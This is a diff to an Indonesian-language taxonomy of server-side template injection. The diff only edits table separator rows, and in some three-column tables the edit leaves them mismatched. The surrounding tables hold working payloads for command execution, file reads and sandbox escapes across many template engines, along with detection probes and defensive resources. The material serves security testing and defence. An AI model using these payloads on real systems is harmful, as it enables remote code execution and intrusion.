@@ -24,7 +24,7 @@ Taxonomi ini mengorganisir permukaan serangan SSTI sepanjang tiga sumbu ortogona
 ### Ringkasan Sumbu 2: Tipe Filter/Restriction Bypass
 
 | Tipe Bypass | Mekanisme | Engine yang Berlaku |
-|---|---|---|
+|---|---|---|---|
 | **Character Encoding** | Hex (`\x5f`), Unicode, URL-encoding dari karakter yang dibatasi | Jinja2, FreeMarker, Twig |
 | **Alternative Accessor** | `|attr()`, bracket notation, `getlist()`, `|first` | Jinja2, Twig |
 | **String Construction** | `|join`, `~` concatenation, `chr()`, `?lower_abc` | Jinja2, Twig, Smarty, FreeMarker |
@@ -126,7 +126,7 @@ Dalam JavaScript template engine (Node.js), eksploitasi mencerminkan MRO Python 
 Java template engine dieksploitasi melalui reflection — mengakses `getClass()`, kemudian `forName()` untuk mencapai `java.lang.Runtime` atau `java.lang.ProcessBuilder` untuk command execution.
 
 | Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Direct getClass chain** | Pebble (< 3.0.9) | Traversal `variable.getClass().forName(...)` | `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}` |
 | **TYPE field bypass** | Pebble (>= 3.0.9) | Field wrapper Java `TYPE` (`(1).TYPE`) menyediakan `Class` tanpa `getClass()` | Via `java.lang.Integer.TYPE` → akses `Class` |
 | **Velocity ClassTool** | Velocity | `$class.inspect()` dan `$class.type` memperoleh arbitrary class reference | `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")` |
@@ -168,7 +168,7 @@ Twig (PHP) menyediakan environment default yang lebih restricted, tetapi beberap
 ### §3-3. Smarty Built-in Exploitation
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **`{if}` tag code execution** | `{if}` Smarty mengevaluasi PHP expression | Smarty security policy tidak membatasi `{if}` | `{if system('id')}{/if}` |
 | **Static class access** | `Smarty_Internal_Write_File` dan static class lainnya accessible | Static class tidak dibatasi | File write untuk membuat webshell |
 | **`chr()` + `cat` construction** | `chr()` menghasilkan karakter, modifier `cat` menggabungkan | Akses Smarty function | `{chr(105)\|cat:chr(100)}` → `"id"` → pass ke `passthru()` |
@@ -179,7 +179,7 @@ Twig (PHP) menyediakan environment default yang lebih restricted, tetapi beberap
 Go template engine menyajikan model eksploitasi yang unik: tidak ada intrinsic dangerous function, tetapi **exported method** apa pun pada object yang di-pass ke template dapat dipanggil.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Exposed method call** | Panggil public method pada struct yang di-pass ke `Execute()` | Target struct memiliki method dengan dangerous side effects | `{{ .ExecuteCmd "id" }}` atau `{{ .GetFile "/etc/passwd" }}` |
 | **Method confusion** | Eksploitasi method name collision atau unexpected method accessibility dalam deep object graph | Complex struct hierarchies di-pass ke template | Enumerate accessible method via `{{ . }}` |
 | **`call` built-in (text/template)** | Function `call` dari `text/template` meng-invoke function value apa pun | Field function-type dalam template data | `{{ call .DangerousFunc "arg" }}` |
@@ -195,7 +195,7 @@ Ketika template engine mengimplementasikan security sandbox, attacker harus mene
 Sandbox FreeMarker dikontrol oleh konfigurasi `TemplateClassResolver`. Bahkan dengan `ALLOWS_NOTHING_RESOLVER`, beberapa jalur bypass ada.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **`?api` + ClassLoader chain** | Built-in `?api` mengakses Java API; `getProtectionDomain().getClassLoader()` memperoleh ClassLoader | `setAPIBuiltinEnabled(true)` dan FreeMarker < 2.3.30 | ClassLoader → load arbitrary class → instantiate `Execute` |
 | **`getResourceAsStream` file read** | `getResourceAsStream()` dari ClassLoader membaca classpath dan filesystem resource | ClassLoader accessible via `?api` | Read via scheme URI `file://`, `http://`, `ftp://` (SSRF) |
 | **Application utility class abuse** | Manfaatkan application-specific class yang diekspos ke template (misalnya, `GroovyUtil.eval()` dari OFBiz) | Aplikasi mengekspos utility class via hash `Static` | `${Static["org.apache.ofbiz.base.util.GroovyUtil"].eval("['id'].execute().text")}` (CVE-2024-48962) |
@@ -207,7 +207,7 @@ Sandbox FreeMarker dikontrol oleh konfigurasi `TemplateClassResolver`. Bahkan de
 Sandbox Twig membatasi allowed tag, filter, method, dan property melalui `SecurityPolicy`. Bypass menargetkan gap antara policy enforcement dan object yang accessible dalam template context.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Runtime configuration modification** | Modifikasi `system.twig.safe_functions` / `safe_filters` via `grav.twig.twig_vars['config']` untuk whitelist dangerous function | Grav CMS dengan editor access (CVE-2024-28116) | Step 1: tambahkan `system` ke safe_functions. Step 2: `{{ system('id') }}` |
 | **`_self.env` method calls** | Akses method Twig Environment via referensi `_self` | Twig 1.x (deprecated dalam 2.x) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
 | **Regex sanitization bypass** | Nested call `evaluate_twig()` melewati weak regex-based `cleanDangerousTwig` | Grav CMS (CVE-2025-66294) | Nested Twig directive menghindari single-pass regex |
@@ -218,7 +218,7 @@ Sandbox Twig membatasi allowed tag, filter, method, dan property melalui `Securi
 Thymeleaf mengimplementasikan defense modern termasuk pembatasan package berbasis denylist (`java.`, `javax.`, `org.springframework.util.`), instantiation blocking, dan pencegahan static class access.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Preprocessing double evaluation** | Preprocessing `__${expr}__` mengevaluasi content antara double underscore sebelum main expression | Input pengguna direfleksikan dalam preprocessing context | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::x` |
 | **Third-party library reflection** | Gunakan `org.apache.commons.lang3.reflect.MethodUtils` (tidak dalam denylist) untuk reflection call | commons-lang3 di classpath (umum dalam Spring Boot) | `MethodUtils.invokeStaticMethod(forName("java.lang.Runtime"), "getRuntime")` → `exec()` |
 | **Spring context variable access** | Akses object Spring request/response melalui context variable untuk exfiltrate output | Spring MVC integration | Output via object response tanpa external connection |
@@ -229,7 +229,7 @@ Thymeleaf mengimplementasikan defense modern termasuk pembatasan package berbasi
 Pebble membatasi akses ke `getClass()` dan method berbahaya lainnya. Bypass memanfaatkan type system Java dan framework integration.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Case-insensitive method bypass** | Pebble < 3.0.9 memeriksa `getClass` secara case-sensitive | Pebble < 3.0.9 | `{{ variable.GetClass().forName(...) }}` |
 | **Java wrapper TYPE field** | `java.lang.Integer.TYPE` (dan serupa) menyediakan object `Class` tanpa `getClass()` | Java wrapper type apa pun yang accessible | `{{ (1).TYPE }}` → `java.lang.Class` → reflection chain |
 | **Spring bean object graph** | Traverse exposed Spring bean untuk menemukan object dengan ClassLoader atau akses `exec()` | Spring integration dengan bean yang diekspos ke template | Deep inspection dari bean object graph untuk dangerous method |
@@ -240,7 +240,7 @@ Pebble membatasi akses ke `getClass()` dan method berbahaya lainnya. Bypass mema
 `SandboxedEnvironment` dari Jinja2 membatasi attribute access dan method call. Escape mengandalkan mencapai object dari environment yang tidak di-sandbox.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Explicitly passed objects** | Object yang di-pass ke `render_template()` mungkin memiliki unrestricted method access | Developer me-pass object dengan dangerous method | Abuse method dari application-specific object |
 | **`__globals__` via allowed objects** | Bahkan dalam sandbox, jika `__init__.__globals__` chain dari allowed object mencapai `os`, execution mungkin | Sandbox tidak memblokir traversal `__globals__` pada allowed object | `{{ allowed_obj.__init__.__globals__['os'].popen('id').read() }}` |
 | **Format string escape** | `format_map()` atau `format()` pada string object untuk mengakses globals | Sandbox mengizinkan string formatting | String format specifiers untuk leak atau access restricted object |
@@ -256,7 +256,7 @@ Dalam environment JavaScript (Node.js), template engine dapat dikompromikan buka
 EJS mengkompilasi template menjadi JavaScript function. Prototype pollution dapat menyuntikkan code ke dalam compilation output.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **`outputFunctionName` pollution** | Cemari `Object.prototype.outputFunctionName` dengan JS code; EJS menggabungkannya ke dalam compiled function | Server-side prototype pollution + EJS rendering | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('id');//"}}` |
 | **`escapeFunction` pollution** | Cemari `opts.escapeFunction`; ketika `opts.client` truthy, EJS merefleksikannya unsanitized ke dalam compiled code | Prototype pollution + flag `client` | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').exec('id')"}}` |
 | **`destructuredLocals` pollution** | Cemari array-like properties untuk menyuntikkan destructuring pattern ke dalam compiled output | Versi EJS dengan dukungan destructured locals | Inject malicious variable names dalam destructuring |
@@ -265,7 +265,7 @@ EJS mengkompilasi template menjadi JavaScript function. Prototype pollution dapa
 ### §5-2. Other Node.js Engine Pollution
 
 | Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Pug options pollution** | Pug | Cemari compiler options untuk menyuntikkan code selama template compilation | `{"__proto__":{"block":{"type":"Text","val":"...child_process..."}}}` |
 | **Handlebars helper pollution** | Handlebars | Cemari prototype untuk register malicious helper atau modifikasi compilation | Abuse `__lookupGetter__` dan `__defineGetter__` |
 | **`constructor.constructor` chain** | Multiple engine | Bahkan tanpa direct pollution, `constructor.constructor` mencapai `Function` untuk eval | `{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}` |
@@ -281,7 +281,7 @@ Beberapa template engine mengimplementasikan multi-phase template processing di 
 Preprocessing expression Thymeleaf mengevaluasi content antara marker `__...__` sebelum main expression evaluation pass.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **URL parameter preprocessing** | Input pengguna dalam expression URL `@{...}` dengan preprocessing `__${input}__` | Input direfleksikan dalam atribut URL `th:href` atau serupa | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` |
 | **Fragment expression preprocessing** | Input digunakan dalam fragment selector `~{template :: __${input}__}` | Dynamic fragment resolution | Inject expression yang dievaluasi selama preprocessing |
 | **Attribute preprocessing** | Input dalam `th:text`, `th:value`, atau atribut lain dengan preprocessing | Double-underscore marker dalam nilai atribut template | `__${expression}__` dievaluasi sebelum outer expression |
@@ -289,7 +289,7 @@ Preprocessing expression Thymeleaf mengevaluasi content antara marker `__...__` 
 ### §6-2. Multi-Pass Template Rendering
 
 | Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **Twig double render** | Twig | Template output di-proses ulang melalui Twig (misalnya, CMS me-render user content sebagai template) | First pass menyisipkan payload, second pass mengeksekusi |
 | **Jinja2 `from_string`** | Jinja2 | Aplikasi menggunakan `Environment.from_string()` pada input pengguna, menciptakan direct template execution | `from_string()` memperlakukan input sebagai template source code |
 | **FreeMarker `?interpret`** | FreeMarker | `?interpret` mengevaluasi string sebagai FreeMarker template saat runtime | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` dalam interpreted string |
@@ -304,7 +304,7 @@ Identifikasi template engine adalah prasyarat kritis untuk eksploitasi. Engine y
 ### §7-1. Polyglot-Based Detection
 
 | Subtype | Mekanisme | Contoh Probe |
-|---|---|---|
+|---|---|---|---|
 | **Universal error polyglot** | Single string yang memicu error dalam semua 44 template engine major | `<%'${{/#{@}}%>{{` (16 karakter) |
 | **Arithmetic evaluation probe** | Expression matematika yang me-render hasil dalam engine yang rentan | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` |
 | **String multiplication probe** | Distinguish engine berdasarkan bagaimana mereka menangani string multiplication | `{{7*'7'}}` → Jinja2: `7777777`, Twig: `49` |
@@ -314,7 +314,7 @@ Identifikasi template engine adalah prasyarat kritis untuk eksploitasi. Engine y
 ### §7-2. Behavioral Fingerprinting
 
 | Subtype | Mekanisme | Sinyal Pembeda |
-|---|---|---|
+|---|---|---|---|
 | **Delimiter-based identification** | Test style delimiter yang berbeda: `{{ }}`, `<% %>`, `${ }`, `#{ }`, `{% %}` | Delimiter mana yang menyebabkan evaluation vs. literal output |
 | **Built-in object probing** | Probe untuk object spesifik engine: `self`, `_self`, `this`, `request`, `env` | Eksistensi object mengkonfirmasi engine spesifik |
 | **Filter/function availability** | Test engine-specific filter: `\|attr`, `?api`, `\|sort`, `\|map` | Eksistensi filter mempersempit identitas engine |
@@ -365,7 +365,7 @@ Ketika karakter spesifik difilter (underscore, dot, bracket, quote, dll.), fitur
 ### §8-3. Context-Aware Delivery Techniques
 
 | Teknik | Mekanisme | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **HTTP header smuggling** | Deliver bagian payload via HTTP header, akses via `request.headers` | `request\|attr(request.headers.x)` dengan header `X: __class__` |
 | **Cookie-based delivery** | Simpan komponen payload dalam cookie, akses via `request.cookies` | `request\|attr(request.cookies.x)` |
 | **Multi-parameter split** | Pecah payload di seluruh multiple GET/POST parameter, reassemble dalam template | Setiap `request.args.paramN` membawa fragment |
@@ -430,7 +430,7 @@ Ketika karakter spesifik difilter (underscore, dot, bracket, quote, dll.), fitur
 ### Defensive Tools & Resources
 
 | Tool | Tipe | Target Scope | Core Technique |
-|---|---|---|
+|---|---|---|---|
 | **Template Injection Table** | Interactive reference | 44 engine | Polyglot → engine identification mapping (Hackmanit) |
 | **Template Injection Playground** | Testing environment | Multiple engine | Docker-based lab untuk testing payload SSTI secara aman |
 | **Semgrep SSTI Rules** | Static analysis | Multiple framework | Pattern-based detection dari unsafe template rendering dalam source code |
@@ -440,7 +440,7 @@ Ketika karakter spesifik difilter (underscore, dot, bracket, quote, dll.), fitur
 ### Research Resources
 
 | Resource | Tipe | Cakupan |
-|---|---|---|
+|---|---|---|---|
 | **PortSwigger Web Security Academy** | Interactive labs | SSTI detection, identification, exploitation, sandbox escape |
 | **HackTricks SSTI** | Reference wiki | Comprehensive engine-specific payload documentation |
 | **GoSecure Template Injection Workshop** | Training material | Hands-on workshop mencakup multiple engine |
